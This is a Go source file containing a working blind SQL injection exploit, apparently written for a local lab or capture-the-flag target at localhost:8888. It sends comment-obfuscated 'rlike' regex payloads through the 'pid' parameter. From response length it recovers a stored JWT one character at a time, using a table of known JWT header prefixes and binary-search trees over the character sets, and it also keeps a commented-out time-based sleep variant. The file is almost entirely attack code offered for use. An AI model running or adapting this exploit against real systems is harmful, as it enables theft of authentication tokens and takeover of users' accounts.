package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"strconv"
	"strings"
	"time"

	"github.com/fatih/color"
)

var totalRequests int
var dot = 46
var dash = 45
var underscore = 95

func createTree(arr []int, start int, end int) []int {
	tmpList := []int{}

	if start > end {
		return []int{}
	}

	mid := start + (end-start)/2
	root := arr[mid]
	left := createTree(arr, start, mid-1)
	right := createTree(arr, mid+1, end)

	tmpList = append(tmpList, root)
	tmpList = append(tmpList, left...)
	tmpList = append(tmpList, right...)

	return tmpList
}

func getheader(query string) string {

	token := ""

	headers := map[string]string{
		//I+I|M|U
		"IUzI": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.",
		"IUzM": "eyJhbGciOiJIUzM4NCIsInR5cCI6IkpXVCJ9.",
		"IUzU": "eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.",

		//S+I|M|U
		"SUzI": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.",
		"SUzM": "eyJhbGciOiJSUzM4NCIsInR5cCI6IkpXVCJ9.",
		"SUzU": "eyJhbGciOiJSUzUxMiIsInR5cCI6IkpXVCJ9.",

		//F+I|M|U
		"FUzI": "eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.",
		"FUzM": "eyJhbGciOiJFUzM4NCIsInR5cCI6IkpXVCIsImtpZCI6ImlUcVhYSTB6YkFuSkNLRGFvYmZoa00xZi02ck1TcFRmeVpNUnBfMnRLSTgifQ.",
		"FUzU": "eyJhbGciOiJFUzUxMiIsInR5cCI6IkpXVCIsImtpZCI6InhaRGZacHJ5NFA5dlpQWnlHMmZOQlJqLTdMejVvbVZkbTd0SG9DZ1NOZlkifQ.",

		//Q+I|M
		"QUzI": "eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.",
		"QUzM": "eyJhbGciOiJQUzM4NCIsInR5cCI6IkpXVCJ9.",
	}

	checkAlgoArray := []string{
		"\"^.{11}[I]\"",
		"\"^.{11}[S]\"",
		"\"^.{11}[F]\"",
		"\"^.{11}[Q]\"",
	}
	checkAlgoArrayInner := []string{
		"\"^.{14}[I]\"",
		"\"^.{14}[M]\"",
		"\"^.{14}[U]\"",
	}

	//Step 1, Check Header
	flag := checkArr(query, checkAlgoArray)
	Header := checkArr(query, checkAlgoArrayInner)

	if flag == 0 {
		if Header == 0 {
			token = headers["IUzI"]
		} else if Header == 1 {
			token = headers["IUzM"]
		} else if Header == 2 {
			token = headers["IUzU"]
		}
	}
	if flag == 1 {
		if Header == 0 {
			token = headers["SUzI"]
		} else if Header == 1 {
			token = headers["SUzM"]
		} else if Header == 2 {
			token = headers["SUzU"]
		}
	}
	if flag == 2 {
		if Header == 0 {
			token = headers["FUzI"]
		} else if Header == 1 {
			token = headers["FUzM"]
		} else if Header == 2 {
			token = headers["FUzU"]
		}
	}
	if flag == 3 {
		if Header == 0 {
			token = headers["QUzI"]
		} else if Header == 1 {
			token = headers["QUzM"]
		}
	}
	return token

}

func checkArr(query string, arr []string) int {
	mTarget := "http://localhost:8888/index.php?pid="
	retchar := 0
	for i := 0; i < len(arr); i++ {

		target := mTarget + strings.Replace(query, "[check]", arr[i], -1)
		// start := time.Now()
		resp, _ := http.Get(target)
		bytes, _ := ioutil.ReadAll(resp.Body)
		stringbody := string(bytes)
		resp.Body.Close()
		totalRequests++
		// elapsed := time.Since(start).Seconds()
		// fmt.Printf("http.Get to Target took %v seconds \n", elapsed)
		// if elapsed > 1 {
		// 	retchar = i
		// 	break
		// }
		if len(stringbody) > 30 {
			// fmt.Println(stringbody)
			retchar = i
		}
	}
	return retchar
}

func checkChar(query string, arr []string, it int) int {
	mTarget := "http://localhost:8888/index.php?pid="
	retchar := 0
	for i := 0; i < 6; i++ {

		target := mTarget + strings.Replace(query, "[check]", arr[i], -1)
		target = strings.Replace(target, "[iterate]", strconv.Itoa(it), -1)
		// fmt.Println(target)
		// start := time.Now()
		resp, _ := http.Get(target)
		bytes, _ := ioutil.ReadAll(resp.Body)
		stringbody := string(bytes)
		resp.Body.Close()
		totalRequests++
		// elapsed := time.Since(start).Seconds()
		// fmt.Printf("http.Get to Target took %v seconds \n", elapsed)
		// if elapsed > 1 {
		// 	retchar = i
		// 	break
		// }
		if len(stringbody) > 30 {
			// fmt.Println(stringbody)
			retchar = i
		}
	}
	return retchar
}

func getChar(query string, arr []int, it int) int {
	mTarget := "http://localhost:8888/index.php?pid="
	retchar := 0

	for i := 0; i < len(arr); i++ {
		iterate := "\"^.{[iterate]}[" + string(arr[i]) + "]\""
		target := mTarget + strings.Replace(query, "[check]", iterate, -1)
		target = strings.Replace(target, "[iterate]", strconv.Itoa(it), -1)
		// fmt.Println(target)
		// start := time.Now()
		resp, _ := http.Get(target)
		bytes, _ := ioutil.ReadAll(resp.Body)
		stringbody := string(bytes)
		resp.Body.Close()
		totalRequests++
		// elapsed := time.Since(start).Seconds()
		// fmt.Printf("http.Get to Target took %v seconds \n", elapsed)
		// if elapsed > 1 {
		// 	retchar = arr[i]
		// 	// fmt.Println(string(retchar))
		// 	break
		// }
		if len(stringbody) > 30 {
			// fmt.Println(stringbody)
			retchar = arr[i]
		}
	}
	return retchar
}

func inject(query string) int {
	retchar := 0
	for i := 32; i < 126; i++ {
		totalRequests++
		target := "http://localhost:8888/index.php?pid="
		target = target + strings.Replace(query, "[CHAR]", strconv.Itoa(i), -1)
		start := time.Now()
		resp, _ := http.Get(target)
		// bytes, _ := ioutil.ReadAll(resp.Body)
		// stringbody := string(bytes)
		// fmt.Println(stringbody)
		resp.Body.Close()
		elapsed := time.Since(start).Seconds()
		fmt.Printf("http.Get to Target took %v seconds \n", elapsed)
		if elapsed > 1 {
			retchar = i
		}
		// if len(stringbody) > 30 {
		// fmt.Println(stringbody)
		// retchar = i
		// }
	}
	return retchar
}

func main() {
	totalRequests = 0
	color.Magenta("[+] Retriving JWT Tokens.....")
	fmt.Print("[+] ")

	// payload := "1/**/AND/**/((select/**/case/**/when((/**/CAST(jwt/**/AS/**/BINARY)/**/rlike/**/[check]))/**/then/**/sleep(2)/**/else/**/null/**/end))"

	payload := "1/**/AND/**/(select/**/CAST(jwt/**/AS/**/BINARY)/**/rlike/**/[check])"

	// oldpayload := strings.Replace(payload, "[ch]", strconv.Itoa(i), -1)
	// newpayload := strings.Replace(payload, "[ch]", strconv.Itoa(i), -1)

	// getcharacter := (inject(oldpayload))
	getcharacter := (getheader(payload))

	// fmt.Println(getcharacter)

	arrNumbers := []int{}
	arrLowers := []int{}
	arrUppers := []int{}

	for i := 48; i <= 57; i++ {
		arrNumbers = append(arrNumbers, i)
	}
	for i := 97; i <= 122; i++ {
		arrLowers = append(arrLowers, i)
	}
	for i := 65; i <= 90; i++ {
		arrUppers = append(arrUppers, i)
	}

	numbersTree := createTree(arrNumbers, 0, len(arrNumbers)-1)
	lowerTree := createTree(arrLowers, 0, len(arrLowers)-1)
	upperTree := createTree(arrUppers, 0, len(arrUppers)-1)

	arrCase := []string{
		"\"^.{[iterate]}[a-z]\"",
		"\"^.{[iterate]}[A-Z]\"",
		"\"^.{[iterate]}[0-9]\"",
		"\"^.{[iterate]}[-]\"",
		"\"^.{[iterate]}[_]\"",
		"\"^.{[iterate]}[.]\"",
	}

	fmt.Print(getcharacter)
	// fmt.Println(len(getcharacter))

	for i := len(getcharacter); i < 155; i++ {
		k := checkChar(payload, arrCase, i)
		// fmt.Println(k)
		if k == 0 {
			j := getChar(payload, lowerTree, i)
			fmt.Printf("%c", j)
		} else if k == 1 {
			j := getChar(payload, upperTree, i)
			fmt.Printf("%c", j)
		} else if k == 2 {
			j := getChar(payload, numbersTree, i)
			fmt.Printf("%c", j)
		} else if k == 3 {
			fmt.Printf("%s", "-")
		} else if k == 4 {
			fmt.Printf("%s", "_")
		} else if k == 5 {
			fmt.Printf("%s", ".")
		}

	}

	color.Red("\n[+] Number of Requests: %d\n", totalRequests)
	fmt.Println("[+] Exfiltration Done!")

}
